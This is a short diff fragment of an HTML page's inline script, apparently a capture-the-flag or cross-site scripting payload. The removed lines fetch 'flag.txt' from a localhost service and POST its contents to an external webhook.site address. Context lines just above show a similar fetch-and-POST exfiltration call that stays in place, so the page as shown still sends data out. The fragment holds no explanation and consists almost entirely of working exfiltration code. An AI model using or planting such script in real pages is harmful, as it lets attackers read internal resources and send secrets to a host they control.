@@ -12,15 +12,6 @@
                     body: JSON.stringify({ response: data })
                 });
             });
-        fetch('http://localhost:5000/flag.txt')
-            .then(response => response.text())
-            .then(data => {
-                fetch('https://webhook.site/9faca373-e052-47e8-b1e2-4356a2db2f2e', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ response: data })
-                });
-            });
     </script>
 </head>
 <body>
